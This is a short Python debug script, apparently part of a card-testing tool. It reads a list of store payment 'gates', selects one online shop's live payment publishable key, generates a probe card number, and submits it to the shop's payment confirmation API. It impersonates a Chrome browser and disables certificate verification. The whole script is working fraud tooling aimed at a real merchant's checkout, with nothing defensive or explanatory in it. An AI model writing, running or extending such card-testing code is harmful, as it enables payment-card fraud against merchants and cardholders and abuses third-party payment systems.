# language: python, file: scratch/_debug_one.py — params ошибки одного проблемного гейта
import asyncio
import sys

from curl_cffi.requests import AsyncSession

import gate_client as gc

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")


async def main():
    root = "https://layers-of-learning.com"
    pk = ""
    import json
    gates = json.load(open("data/store_gates.json", encoding="utf-8"))
    for g in gates:
        if g["domain"] == "layers-of-learning.com":
            pk = g.get("pk_live", "")
    print("using pk:", pk[:24])
    probe = gc.gen_probe_card()
    card_raw = f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        res = await gc.store_api_confirm(s, root, pk, card_raw, country="US",
                                         max_price_cents=3000)
    for k, v in res.items():
        print(f"{k}: {v}")


if __name__ == "__main__":
    asyncio.run(main())
